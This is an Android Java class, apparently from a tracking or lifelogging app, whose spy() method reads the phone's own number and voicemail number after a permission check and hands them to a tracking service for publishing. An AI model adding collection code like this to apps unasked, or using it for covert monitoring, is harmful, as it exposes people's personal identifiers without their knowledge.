package net.datadeer.app.lifestream;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import androidx.core.app.ActivityCompat;
import android.telephony.TelephonyManager;

import org.json.JSONException;
import org.json.JSONObject;

class TrackerPhoneNumbers extends TrackerMethod {


    public TrackerPhoneNumbers(){this("Phone");}
    public TrackerPhoneNumbers(String name) {
        super(name);
    }

    @Override
    public void spy() {
        TelephonyManager tMgr = (TelephonyManager) getContext().getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(getContext(), Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED)
            return;

        try {
            JSONObject ret = new JSONObject();
            ret.put("Line1Number", tMgr.getLine1Number());
            ret.put("VoiceMailNumber", tMgr.getVoiceMailNumber());

            TrackerService.publishSpyResults(this, ret);

        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

}